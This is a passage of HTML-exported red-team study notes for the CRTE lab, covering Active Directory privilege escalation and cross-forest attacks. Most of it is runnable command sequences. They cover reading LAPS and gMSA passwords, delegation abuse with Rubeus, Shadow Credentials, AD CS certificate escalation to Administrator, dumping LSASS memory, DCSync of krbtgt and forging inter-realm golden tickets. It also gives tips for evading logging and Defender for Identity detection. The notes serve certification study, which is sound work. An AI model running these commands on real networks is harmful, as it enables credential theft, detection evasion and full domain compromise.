style="width:260px"><code>$env:UserDNSDomain</code></td><td id="~Bof" class="" style="width:453.00000762939453px">Get current forest name</td></tr></tbody></table><ul id="47a5e36a-cec9-445c-b948-2e99e1a4ec1f" class="bulleted-list"><li style="list-style-type:disc">ensure that you do not breach ticket policies when forging/modifying a ticket for persistence!</li></ul><h2 id="23670dda-f11d-4657-84f0-87787ad393a6" class="">AppLocker, WDAC, and Tamper Protection</h2><ul id="6fcc5688-63a0-44db-b351-4f22aff8b140" class="bulleted-list"><li style="list-style-type:disc">can enumerate AppLocker rules with <code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code> </li></ul><ul id="7dbbad17-7b8b-444d-bd28-1f64d3d7e9bc" class="bulleted-list"><li style="list-style-type:disc">can enumerate WDAC with <code>Get-CimInstance -ClassName Win32_DeviceGuard -Namespace
root\Microsoft\Windows\DeviceGuard</code></li></ul><ul id="e2325ba8-212f-4aba-ae15-99fa41ea7b94" class="bulleted-list"><li style="list-style-type:disc">check tamper protection with <code>Get-MpComputerStatus|select IsTamperProtected</code><ul id="05d37f65-ae16-4ef1-8604-d817c9c07f84" class="bulleted-list"><li style="list-style-type:circle">note tamper protection is on by default on Windows Server 2019, 2022, and 1803 or later among other servers</li></ul></li></ul><h2 id="c473bea6-31cf-4859-a028-284c532314b8" class="">Misc</h2><ul id="a6971b0f-fc5a-4a59-a152-051bf9cb13a6" class="bulleted-list"><li style="list-style-type:disc">use <code>Get-ADTrust -Filter &#x27;intraForest -ne $True&#x27; -Server (Get-ADForest).Name</code> to map all trusts of current forest</li></ul><ul id="c6f241d7-f699-4477-8813-7d30b53de8ac" class="bulleted-list"><li style="list-style-type:disc">use <code>(Get-ADForest).Domains | %{Get-ADTrust -Filter &#x27;(intraForest -ne $True) -and (ForestTransitive -ne $True)&#x27; -Server $_}</code> to map all external trusts<ul id="687d595f-0291-4811-ba93-dbd64dd422c4" class="bulleted-list"><li style="list-style-type:circle">can be done also with PowerView’s <code>Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq &#x27;FILTER_SIDS&#x27;}</code></li></ul></li></ul><h1 id="f7cfa0fe-bda5-4142-ba01-0386dc4d702c" class="">Domain Privilege Escalation</h1><h2 id="62a12a95-c900-4d92-8223-670ab66f5d36" class="">LAPS</h2><p id="adc3cb98-4a21-451f-828c-0bffbe1c7c65" class="">Provides centralized storage of local user passwords and periodically rotates passwords. Helps mitigate lateral movement by stopping reuse of passwords. </p><ul id="80275d41-e80a-48a0-bfce-483ae35ca7e4" class="bulleted-list"><li style="list-style-type:disc">check if <code>ms-mcs-admpwd</code> attribute is visible with <code>Get-DomainComputer | Select-Object &#x27;dnshostname&#x27;,&#x27;ms-mcs-admpwd&#x27; | Where-Object {$_.&quot;ms-mcs-admpwd&quot; -ne $null}</code></li></ul><ul id="051e3186-0de8-4974-9bdb-fdc8c9cb7758" class="bulleted-list"><li style="list-style-type:disc">can also use <code>Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($.ObjectAceType -like &#x27;ms-Mcs-AdmPwd&#x27;) -and ($.ActiveDirect
oryRights -match &#x27;ReadProperty&#x27;)} | ForEach-Object {$_ | Add-Member NoteProperty &#x27;IdentityName&#x27; $(Convert-SidToName $.SecurityIdentifier);$}</code> from PowerView to find OUs where LAPS is in use</li></ul><ul id="1d1f0a25-b0eb-4556-b91b-742ac3c49775" class="bulleted-list"><li style="list-style-type:disc">use ADModule’s <code>Get-ADComputer -Identity 0xd4y_machine -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd</code> or PowerView’s <code>Get-DomainObject -Identity 0xd4y_machine | select -ExpandProperty ms-mcs-admpwd</code> to get clear-text password of <code>ms-mcs-admpwd</code> attribute</li></ul><p id="738ddf32-4306-486d-b62f-a9ed79f83a1c" class="">With the creds, you can then do:</p><pre id="e879f24d-2a1e-4afc-a48a-e1e34becdc31" class="code"><code>winrs -r:0xd4y-machine -u:.\Administrator -p:&#x27;$ubscr1beTo0xd4y&#x27; hostname 
net use x: \\0xd4y-machine\C$\Users\Public /user:notes\Administrator &#x27;$ubscr1beTo0xd4y&#x27;

## Then copy the files you need (e.g. NetLoader), perform port-forwarding, and load whatever you want</code></pre><h2 id="5415e9fa-3a44-410a-8773-1d9de47430db" class="">gMSA</h2><ul id="00415beb-62c3-49f6-a75d-1f1aa6b3babc" class="bulleted-list"><li style="list-style-type:disc">provides password management, password rotation (every 30 days), and management of SPNs and delegated administration for service accounts </li></ul><ul id="596df86f-0cd6-4570-9d35-c4e2ea59c2c8" class="bulleted-list"><li style="list-style-type:disc">helps protect against Kerberoast attacks</li></ul><ul id="aedf8f04-5974-49f1-bd71-841dcaa93574" class="bulleted-list"><li style="list-style-type:disc">can potentially read the gMSA password from the <code>msds-ManagedPassword</code> attribute (stored in binary form of MSDS-MANAGEDPASSWORD_BLOB) <ul id="d0f99660-9d9c-4609-ba31-db3498cfabf7" class="bulleted-list"><li style="list-style-type:circle">must be explicitly allowed to do so (not even Domain Admins can read this by default)</li></ul></li></ul><table id="da33c589-d6fb-4496-bee5-ec8309e8b9d4" class="simple-table"><tbody><tr id="8fc5b6c4-6c44-4b51-98e8-a1b166e4355d"><td id="\wCX" class="" style="width:260px"><strong>Command</strong></td><td id="~Bof" class="" style="width:453.00000762939453px"><strong>Description</strong></td></tr><tr id="5e400486-68e8-45e1-8f98-31b5ced5ce7b"><td id="\wCX" class="" style="width:260px"><code>Get-ADServiceAccount -Filter *</code></td><td id="~Bof" class="" style="width:453.00000762939453px">Get all gMSA accounts (denoted with the object class <code>msDS-GroupManagedServiceAccount</code>)</td></tr><tr id="16a67f35-9e80-4f37-99b5-9409ab76e78f"><td id="\wCX" class="" style="width:260px"><code>Get-ADServiceAccount -Identity gmsa_account_0xd4y -Properties * | select PrincipalsAllowedToRetrieveManagedPassword</code></td><td id="~Bof" class="" style="width:453.00000762939453px">Get users that can read the <code>msds-ManagedPassword</code> attribute</td></tr></tbody></table><p id="c19bcd8b-0ae1-40bd-85b5-2a4a07759938" class=""><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Converting gMSA Password to NTLM Hash</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><pre id="26e4ff62-6a3e-4ce5-ad04-0daa766214c8" class="code"><code>$PasswordBlob = (Get-ADServiceAccount -Identity 0xd4y -Properties msDS-ManagedPassword).&#x27;msDS-ManagedPassword&#x27;
Import-Module C:\PATH\TO\DSInternals.psd1
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $PasswordBlob 
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword</code></pre><h3 id="aa311353-00a9-42d3-9124-97f62b330bce" class="">Golden gMSA</h3><ul id="d240bf80-6e92-440c-884b-4449e1bb7f9a" class="bulleted-list"><li style="list-style-type:disc">an attack in which gMSA is calculated offline using the KDS root key object<ul id="7401841b-90f6-45a8-bcd7-b169e555b090" class="bulleted-list"><li style="list-style-type:circle">only DAs, EAs, and SYSTEM can retrieve KDS root key</li></ul></li></ul><h2 id="f70b5b45-3f35-42ac-9bd2-d0a2cdc7a0f8" class="">Constrained Delegation - Kerberos Only</h2><p id="db3e716a-2a1b-4e00-8e59-ff4f2f06a416" class="">S4U2Self does not work because it does not have TRUSTED_TO_AUTH_FOR_DELEGATION configured</p><ul id="5646dcde-f229-4119-8579-7f7434cdf1bf" class="bulleted-list"><li style="list-style-type:disc">leverage resource-based constrained delegation (RBCD) <ol type="1" id="1a064d57-d7fd-4711-aecb-48eeda54329b" class="numbered-list" start="1"><li>Create new machine account</li></ol><ol type="1" id="300bd25f-5f7a-40e6-ba00-b61856561dbf" class="numbered-list" start="2"><li>Configured RBCD on machine</li></ol><ol type="1" id="3c0ac617-d914-451e-a5ef-83c4cd74b0f6" class="numbered-list" start="3"><li>Get TGS for machine using new machine account</li></ol><ol type="1" id="382f0360-16e9-42a6-a1de-2c6d610fe6e2" class="numbered-list" start="4"><li>Request forwardable TGS using the previous TGS</li></ol></li></ul><p id="95505e25-ac08-466e-83d2-d9b44f9b392a" class=""><strong>Getting access to target_machine from original_machine</strong></p><pre id="23a67ebf-bcc1-48fd-a23b-abfc649aca7d" class="code"><code># Get machines with constrained delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne &quot;$null&quot;} -Properties msDS-AllowedToDelegateTo

# Create new machine accouunt (use Powermad.ps1)
New-MachineAccount -MachineAccount new_machine_account

# Inject original machine account TGT in session
Rubeus.exe asktgt /user:machine_account$ /aes256:&lt;MACHINE_ACCOUNT_AES256_KEY&gt; /impersonateuser:Administrator /domain:notes.0xd4y.local /ptt /nowrap

# Configure TRUST_TO_AUTH_FOR_DELEGATION
Set-ADComputer -Identity original_machine_account$ -PrincipalsAllowedToDelegateToAccount new_machine_account$ 

# Convert password of new machine account to NTLM hash
Rubeus.exe hash /password:new_machine_account_pass

# Get TGS for service
Rubeus.exe s4u /impersonateuser:Administrator /user:new_machine_account$ /rc4:&lt;NTLM_HASH&gt; /msdsspn:cifs/original_machine.notes.0xd4y.local /nowrap

# Inject TGS in current session
Rubeus.exe s4u /tgs:&lt;TGS&gt; /user:original_machine_account$ /aes256:&lt;MACHINE_ACCOUNT_AES256_KEY&gt; /msdsspn:cifs/target_machine.notes.0xd4y.local /altservice:http /nowrap /ptt</code></pre><ul id="6b416931-13d7-4257-b85a-cc6c1a8a412c" class="bulleted-list"><li style="list-style-type:disc">use winrs instead of PSRemoting to evade certain logging: <code>winrs -remote:0xd4y_server -u:notes\0xd4y -p:Pl3as3Subscr1b3 &lt;COMMAND&gt;</code><ul id="36315386-d706-4694-8f18-3579bbe7b42c" class="bulleted-list"><li style="list-style-type:circle">can evade system-wide transcripts and deep script block logging</li></ul></li></ul><p id="0202ec9f-9382-4231-a0e1-1868eeb8bf0f" class="">With credentials, execute commands on remote machine like this:</p><pre id="a7086193-5316-451f-b0ed-f80adbcd7181" class="code"><code>$creds = Get-Credential
Invoke-Command -Credential $creds -ScriptBlock {whoami} -Computer 0xd4y_machine</code></pre><ul id="5916fec1-96b8-4ebd-be41-cf4905e2aa46" class="bulleted-list"><li style="list-style-type:disc">use <code>opassth</code> with <code>SafetyKatz</code>  (instead of <code>pth</code>) and <code>aes256</code> instead of <code>ntlm</code> to prevent detections by MDI<ul id="35bebdd7-d9b8-4d1c-8d57-ce17b5bf124d" class="bulleted-list"><li style="list-style-type:circle">starts PowerShell session with logon type 9 just like <code>runas /netonly</code></li></ul><ul id="e965e502-9c7f-4c01-b055-9c7f099f3a95" class="bulleted-list"><li style="list-style-type:circle">note <code>opassth</code> is just the command specific to the modified Mimikatz version in the CRTE lab (modified version of <code>pth</code>)</li></ul></li></ul><h3 id="d84860b9-5724-418f-bc21-897ab1e6cc63" class="">GenericWrite on Computer</h3><ul id="35c3604e-1c68-4e9f-80ea-1a5c58464f8a" class="bulleted-list"><li style="list-style-type:disc">with <code>GenericWrite</code> or <code>GenericAll</code> on a computer, you can enable constrained delegation to laterally move</li></ul><p id="f5df9c64-c3ad-437a-9f8f-48c747290abb" class=""><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Enabling Constrained Delegation</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><pre id="af244982-e126-4f59-a989-b776c46dfd69" class="code"><code># Enabled resource-based constrained delegation on target machine
Set-ADComputer -Identity target_machine -PrincipalsAllowedToDelegateToAccount owned_machine_account$

# Get hash of owned machine account
SafetyKatz &quot;sekurlsa::ekeys&quot; 

# Get TGS for HTTP service by impersonating Admin
Rubeus.exe s4u /user:owned_machine_account$ /aes256:&lt;owned_machine_account_hash&gt; /msdsspn:http/target_machine /impersonateuser:Administrator /ptt
</code></pre><h2 id="23468e89-60b6-4666-a8dc-d0d260610435" class="">Shadow Credentials</h2><ul id="ac077451-36db-4c68-b365-87fcaef709de" class="bulleted-list"><li style="list-style-type:disc">leverages <code>msDS-KeyCredentialLink</code> attribute to authenticate as another user or computer account<ul id="92e50f62-07e8-403b-8950-9143a08a2843" class="bulleted-list"><li style="list-style-type:circle">attribute used when Windows Hello for Business (WHfB) is configured</li></ul></li></ul><ul id="2c711d00-4bed-4c9e-b90e-2ec6306f364e" class="bulleted-list"><li style="list-style-type:disc"><code>msDS-KeyCredentialsLink</code> attribute contains raw public keys of certificate, and will still work even if the credentials of the user or computer account are modified</li></ul><ul id="c9ee32a6-3b70-4e15-86d8-6ce69b9aecc1" class="bulleted-list"><li style="list-style-type:disc">only Key Admins and Enterprise Key Admins, or users with <code>GenericAll</code> or <code>GenericWrite</code> are allowed to modify the <code>msDS-KeyCredentialsLink</code> attribute on a target user</li></ul><p id="f44df01c-e1cc-4036-b288-8beac954d060" class="">To abuse Shadow Credentials:</p><ol type="1" id="992b3f0b-7c8f-4d5c-8093-096ab535967e" class="numbered-list" start="1"><li>AD CS should be configured or a Key Trust should be present</li></ol><ol type="1" id="11d5833a-6935-4c2c-b2d3-742af88d4242" class="numbered-list" start="2"><li>PKINIT should be supported</li></ol><ol type="1" id="35605c41-ee8e-4135-a56b-1a8e42a8c054" class="numbered-list" start="3"><li>At least one DC with Windows Server 2016 or above</li></ol><ol type="1" id="0f39639d-a16a-433a-ad80-1ea39877a094" class="numbered-list" start="4"><li>Need <code>GenericWrite</code> or <code>GenericAll</code> permissions on target object</li></ol><p id="e4d2f918-384f-47ac-8a1d-93c52103f978" class=""><strong>Adding Shadow Credentials</strong></p><pre id="f31f4140-4cbe-4e07-b6a3-7a6f725c2e3f" class="code"><code># Add Shadow Credential on target object
Whisker.exe add /target:0xd4y_target_user

# Check if msDS-KeyCredentialsLink attribute present on target (use Get-DomainComputer in case of a computer account)
Get-DomainUser -Identity 0xd4y_target_user </code></pre><h2 id="44b5eed6-d9d8-4df4-95bd-a23d90a6c377" class="">Certificate Service</h2><ul id="750e1760-93f0-42fb-adb0-a9a13b7fed7b" class="bulleted-list"><li style="list-style-type:disc">certificate can  be used for authentication, encryption, signing, etc.</li></ul><ul id="2032a633-d369-48e7-bc2f-4c704a8169aa" class="bulleted-list"><li style="list-style-type:disc">check for certificates stored in local machine with <code>ls cert:\LocalMachine\My</code> and then export it with <code>ls cert:\LocalMachine\My\&lt;THUMBPRINT&gt; | Export-PfxCertificate -FilePath C:\PATH\TO\SAVE\cert.pfx -Password (ConvertTo-SecureString -String &#x27;SubscribeTo0xd4y&#x27; -Force -AsPlainText)</code><ul id="24f43e45-0d51-4b1b-8cd3-9f68ae900cb1" class="bulleted-list"><li style="list-style-type:circle">then request TGT using <code>Rubeus.exe asktgt /user:pawadmin /certificate:cert.pfx /password:SubscribeTo0xd4y /nowrap /ptt</code></li></ul></li></ul><p id="d7108ee6-4fbc-48de-ae07-7e663f6f469c" class="">AD CS can be abused to:</p><ol type="1" id="5499135a-e6ae-4136-9132-eb44ec482c19" class="numbered-list" start="1"><li>Extract user and machine certificates</li></ol><ol type="1" id="6cba6270-e6e5-43a6-8594-3061e20c8299" class="numbered-list" start="2"><li>Retrieve NTLM hashes</li></ol><ol type="1" id="88fe5bf2-a064-48b8-a067-924386ebfa81" class="numbered-list" start="3"><li>User and machine level persistence</li></ol><ol type="1" id="5239031b-421f-4d0f-a7c0-5d61f13e5cb0" class="numbered-list" start="4"><li>Escalation to DA and EA</li></ol><ol type="1" id="529252f7-b89b-4922-9e6f-d839a6532a81" class="numbered-list" start="5"><li>Domain persistence</li></ol><figure id="008d4d2c-1beb-4497-bebe-7cb7e695e285" class="image"><a href="../../../../images/images/CRTE%20Notes%20d90ebe33f6774189b29f11b6f3b0175b/Untitled%201.png"><img style="width:1731px" src="../../../../images/CRTE%20Notes%20d90ebe33f6774189b29f11b6f3b0175b/Untitled%201.png"/></a></figure><ul id="217df321-89d2-4fde-bc10-55b7d57517f3" class="bulleted-list"><li style="list-style-type:disc">can use certify.exe to find misconfigured templates (<code>certify.exe find</code>)<ul id="ea4b32d5-bdbe-4fc2-9b4b-2136956f33a8" class="bulleted-list"><li style="list-style-type:circle">note that the <code>/vulnerable</code> flag only shows certificates in which domain users or default users group has enrollment rights </li></ul></li></ul><p id="16a22174-2acb-4838-9263-41f1aec8eed1" class="">Common misconfigurations:</p><ol type="1" id="e7284419-f6fc-4bf0-86a6-2ac18650cc00" class="numbered-list" start="1"><li>CA or target templates gives low-privileged user enrollment rights</li></ol><ol type="1" id="06f46dbd-b378-4fa7-9880-53322d6d7226" class="numbered-list" start="2"><li>Manager approval is disabled</li></ol><ol type="1" id="1e680bc8-91ae-4b9e-a346-1e00b64424d1" class="numbered-list" start="3"><li>Authorization signatures not required</li></ol><p id="67d88863-0e8b-4d2c-bd0e-8b3c4a426e2f" class="">
</p><p id="1624ca6f-e6fb-4c91-976f-fe503187ea15" class=""><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Escalating to DA from CERT</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><pre id="eb0e763f-36a5-433f-8430-d6c70aab592d" class="code"><code># Get information for certs with msPKI-Certificates-Name-Flag set to ENROLLEE_SUPPLIES_SUBJECT
Certify.exe find /enrolleeSuppliesSubject

# Request cert, save text between BEGIN RSA PRIVATE KEY and END CERTIFICATE to a file (e.g. cert.pem)
Certify.exe request /ca:&lt;CA_NAME&gt; /template:&lt;CERT_TEMPLATE&gt; /altname:Administrator 

# Convert to pfx and name password as Follow0xd4y
openssl.exe pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out admin.pfx

# Request TGT
Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:Follow0xd4y /nowrap /ptt</code></pre><h2 id="e04da89e-a870-42a5-b074-a91852c13b45" class="">Misc</h2><ul id="12190c3e-3ac2-4af3-aba7-7a15b840277e" class="bulleted-list"><li style="list-style-type:disc">may be able to add yourself to a group with <code>Add-ADGroupMember -Identity &quot;MachineAdmins&quot; -Members &quot;0xd4y&quot;</code></li></ul><p id="7388fad9-c01e-449d-b68d-4694c6d7e1df" class=""><strong>File transferring with creds</strong></p><pre id="36516d16-af34-41ce-aaad-4ca6427ae644" class="code"><code># Create shared folder between target machine (notes-0xd4y) and local machine
net use x: \\notes-0xd4y\C$\Users\Public /user:Administrator Pl34s3Subscr1be

# Copy files to target machine
echo F | xcopy C:\PATH\TO\Loader.exe x:\Loader.exe
echo F | xcopy C:\PATH\TO\SafetyKatz.exe x:\SafetyKatz.exe

# Delete shared folder
net use x: /d</code></pre><ul id="20bff8ab-d617-4813-bfc6-c3e2ff5d2f54" class="bulleted-list"><li style="list-style-type:disc">check if you have local admin access on another machine with <code>Find-PSRemotingLocalAdminAccess</code></li></ul><ul id="9f8bc547-f0d7-416c-82fd-fbd6c95070e2" class="bulleted-list"><li style="list-style-type:disc">can spawn new instance with compromised creds using Rubeus: <code>./Rubeus.exe asktgt /domain:notes.0xd4y.local /user:0xd4y /aes256:&lt;AES256_KEY&gt; /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></li></ul><p id="d7f976fa-fe8d-4bbb-b8f5-d008bb28f39b" class=""><strong><strong><strong><strong><strong><strong><strong><strong>Lateral Movement Using PSRemoting</strong></strong></strong></strong></strong></strong></strong></strong></p><pre id="3d1373ca-7731-460b-970d-9eb7c238b9bc" class="code"><code>$passwd = ConvertTo-SecureString &#x27;Follow0xd4y&#x27; -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential (&quot;notes\0xd4y&quot;, $passwd)
$session = New-PSSession -ComputerName some_machine -Credential $creds</code></pre><h1 id="6ae3b70d-edaa-446f-9149-a7a6c49f2b63" class="">Cross-Forest Attacks and Privescs</h1><h2 id="5b0bc274-859d-49c6-8426-318cf972c4d9" class="">Kerberoast</h2><p id="a55854b1-3630-41e5-9be9-913ef6f70f94" class="">It is possible to perform kerberoast attacks across forest trusts</p><pre id="887775e7-6d2c-4b18-888a-714bfb5c36d4" class="code"><code># PowerView
Get-DomainTrust | ?{$_.TrustAttributes -eq &#x27;FILTER_SIDS&#x27;} | %{Get-DomainUser -SPN -Domain $_.TargetName}

# AD Module
Get-ADTrust -Filter &#x27;IntraForest -ne $true&#x27; | %{Get-ADUser -Filter {ServicePrincpalName -ne &quot;$null&quot;} -Properties ServicePrincipalName -Server $_.Name}

# Get TGS of target user using only PS
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList some_svc/eu-file.eu.local@eu.local
tasklist.exe /FI &quot;IMAGENAME eq lsass.exe&quot;
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump &lt;LSASS_PID&gt; C:\PATH\TO\SAVE\lsass.dmp full
## Can also just do rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\PATH\TO\SAVE\lsass.dmp full</code></pre><h2 id="5d9fcabd-a188-4e91-a9b7-d7f31839f54c" class="">Constrained Delegation</h2><p id="61279b66-bcda-44da-9da3-fcba16ccc196" class="">Can abuse constrained delegation across forests if you already have a foothold across a forest trust.</p><pre id="556fe4dc-6303-4430-a0d1-0cf40f01b3e7" class="code"><code># PowerView 
Get-DomainUser -TrustedToAuth -Domain target_forest.local
Get-DomainComputer -TrustedToAuth -Domain target_forest.local

# AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne &quot;$null&quot;} -Properties msDS-AllowedToDelegateTo -Server target_forest.local

# Get creds for compromised user and request ldap altservice
./Rubeus.exe s4u /user:&lt;OWNED_USER&gt; /aes256:&lt;OWNED_USER_HASH&gt; /impersonateuser:administrator /msdsspn:CIFS/some_machine.other_forest.local
/altservice:LDAP /domain:other_forest.local /dc:some-dc.other_forest.local /ptt

# DCSync
./SharpKatz.exe --Command dcsync --user other_forest\krbtgt --Domain other_forest.local --DomainController some-dc.other_forest.local</code></pre><ul id="5543d849-f6c5-49ff-b860-4b421867045b" class="bulleted-list"><li style="list-style-type:disc">note that use of AES256 may not work across forests as it depends on whether or not AES encryption is supported</li></ul><figure id="349fcad0-9c19-426c-8bbc-5af7cacbc0e9" class="image"><a href="../../../../images/CRTE%20Notes%20d90ebe33f6774189b29f11b6f3b0175b/Untitled%202.png"><img style="width:426px" src="../../../../images/CRTE%20Notes%20d90ebe33f6774189b29f11b6f3b0175b/Untitled%202.png"/></a></figure><h2 id="ad0dc1d3-8a7e-4f27-826d-2ae8ba3e634a" class="">Unconstrained Delegation</h2><ul id="d3e8dbea-27dd-41f5-a8f9-cf851e2ba231" class="bulleted-list"><li style="list-style-type:disc">TGT delegation must be enabled across trust (disabled by default)<ul id="a13e3aec-247b-4f0e-a49e-527f95283e90" class="bulleted-list"><li style="list-style-type:circle">check this with <code>netdom trust trustingforest /domain:other_forest.local /EnableTgtDelegation</code></li></ul><ul id="e8d8bef0-655a-44a9-b868-16b431cda358" class="bulleted-list"><li style="list-style-type:circle">note this can also be checked with <code>Get-ADTrust -server other_forest.local -Filter *</code> although it could output false negatives and is less reliable in older versions (ensure you are using the right version of the AD Module which fixes this bug) </li></ul></li></ul><h2 id="76f8677a-42ed-4546-8817-7e74651b8a09" class="">Trust Key</h2><ul id="7d4347ac-cd7f-401c-b9b7-5b4abb13e27c" class="bulleted-list"><li style="list-style-type:disc">SID Filtering occurs between forests so that one forest cannot request any resource as an EA or DA for another forest<ul id="bc1b6cf7-c22c-4a72-b1dd-bc0b4ca427a0" class="bulleted-list"><li style="list-style-type:circle">to access resources in trusting domain, SID filtering must be deactivated</li></ul></li></ul><ul id="9253f4cb-884d-4219-9806-64b6a3482a59" class="bulleted-list"><li style="list-style-type:disc">all RIDs between and including 500 and 1000 are stripped (check CRTP notes for more in-depth)</li></ul><ul id="3eb285e0-8b84-4137-971e-541cda027403" class="bulleted-list"><li style="list-style-type:disc">with <code>/enablesidhistory:yes</code> you can attempt to access resources accessible to the specified RID as long as RID &gt; 1000</li></ul><ul id="4e1a6f61-28e4-4648-a0be-b0c1007a15d4" class="bulleted-list"><li style="list-style-type:disc">if <code>Get-ADTrust -Filter *</code> shows that the <code>SIDFilteringForestAware</code> attribute is True, then SIDHistory filtering is enabled across the forest trust</li></ul><p id="55ccb495-3fda-41fa-adb0-2a105f9af218" class=""><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Getting Access to Other Groups </strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><pre id="ebaaf8ca-2441-45c6-ae37-e3524c5a3246" class="code"><code># Get groups in other_forest.local with RID &gt; 1000
Get-ADGroup -Filter &#x27;SID -ge &quot;S-1-5-21-&lt;ID&gt;-1000&quot;&#x27; -Server other_forest.local

# Forge inter-realm TGT using group
./BetterSafetyKatz.exe &quot;kerberos::golden /user:Administrator /domain:0xd4y.local /sid:S-1-5-21-&lt;ID&gt; /rc4:&lt;TRUST_TICKET_HASH&gt; /service:krbtgt /target:other_forest.local /sids:S-1-5-21-&lt;ID&gt;-&lt;RID&gt; /ticket:C:\PATH\TO\SAVE\output.kirbi&quot; &quot;exit&quot;

# Get TGS for service
./Rubeus.exe asktgs /ticket:C:\PATH\TO\output.kirbi /service:HTTP/some_machine.other_forest.local /dc:some-dc.other_forest.local /ptt
</code></pre><h2 id="836f5af0-5e19-4c95-9c67-fda797cafe73" class="">Foreign Security Principal (FSP)</h2><ul id="dd0a85f9-02ee-4bad-8bf6-141c5c3b8396" class="bulleted-list"><li style="list-style-type:disc">allows external forests trust or special identities (e.g. Authenticated Users, Enterprise DCs, etc.) to be <mark class="highlight-yellow_background">added to domain local security groups</mark> (for example Authenticated Users)</li></ul><ul id="66a75a26-3f82-4cb7-b187-89bfd002257c" class="bulleted-list"><li style="list-style-type:disc">can be enumerated with PowerView’s <code>Find-ForeignGroup</code> or <code>Find-ForeignUser</code>, or with AD Module’s <code>Get-ADObject -Filter {objectClass -eq &quot;foreignSecurityPrincipal&quot;}</code><ul id="c85af30e-e4ad-4a05-a80c-7d74ae12d8a8" class="bulleted-list"><li style="list-style-type:circle">then enumerate the group with  <code>Get-ADGroup -Filter * -Properties Member -Server other_forest.local | ?{$_.Member -match &#x27;&lt;SID&gt;&#x27;}</code></li></ul><ul id="e4bc33f0-d770-454b-8505-79442dfd4e59" class="bulleted-list"><li style="list-style-type:circle">can also do <code>Get-DomainUser -Domain other_forest.local |
?{$_.ObjectSid -eq &#x27;&lt;SID&gt;&#x27;}</code> to find user with particular SID</li></ul></li></ul><h2 id="f7d36b56-2c96-4cef-8dfa-44685a618f35" class="">ACLs</h2><ul id="24240953-5c04-4ae9-b650-1797b1ec03b8" class="bulleted-list"><li style="list-style-type:disc">ACLs may grant certain principals to access resources or have <code>GenericAll</code> or <code>GenercWrite</code> on identities cross-forest (principals added to these ACLs are not displayed in the ForeignSecurityPrincipals container)<ul id="a92efd71-ae12-4269-bbaf-e1d1a5bd1527" class="bulleted-list"><li style="list-style-type:circle">only principals in a domain local security group are in the ForeignSecurityPrincipals container</li></ul></li></ul><ul id="9475e393-6bb5-46e8-a9e8-a7fe145b7f75" class="bulleted-list"><li style="list-style-type:disc">with <code>GenericAll</code> you can reset a user’s password with <code>Set-DomainUserPassword -Identity 0xd4y -AccountPassword (ConvertTo-SecureString &#x27;Follow0xd4y&#x27; -AsPlainText -Force) -Domain other_domain.local</code></li></ul><h2 id="7ca7cb2b-f11c-41e6-96d5-cff68c9423c3" class="">PAM Trust</h2><ul id="85e0445d-20a4-424f-87ab-9f419a86580a" class="bulleted-list"><li style="list-style-type:disc">usually enabled between Bastion or Red Forest and prod/user forest</li></ul><ul id="14a49536-0c12-49e1-bbb9-58c32ead9e03" class="bulleted-list"><li style="list-style-type:disc">allows high-privileged access to prod forest without needing credentials from a bastion forest<ul id="1ba4bb41-804c-455f-b25e-f8e0de3851dd" class="bulleted-list"><li style="list-style-type:circle">requires the creation of Shadow Principals in bastion domain that are mapped to DA or EA in prod forest</li></ul></li></ul><pre id="d52098c5-3a44-4564-817d-50150cbe888b" class="code"><code>Get-ADTrust -Filter *
Get-ADObject -Filter {objectClass -eq &quot;foreignSecurityPrincipal&quot;} -Server bastion.local

# Enumerate if PAM trust exists
$bastiondc = New-PSSession bastion-dc.bastion.local
Invoke-Command -ScriptBlock {Get-ADTruzst -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}} -Session $bastiondc

# Check members of Shadow Principals
Invoke-Command -ScriptBlock {Get-ADObject -SearchBase (&quot;CN=Shadow Principal Configuration,CN=Services,&quot; + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc

# Configure WSMan to allow PSRemoting via IP Address
Set-Item WSMan:\localhost\Client\TrustedHosts * -Force

# PSRemote into prod_forest
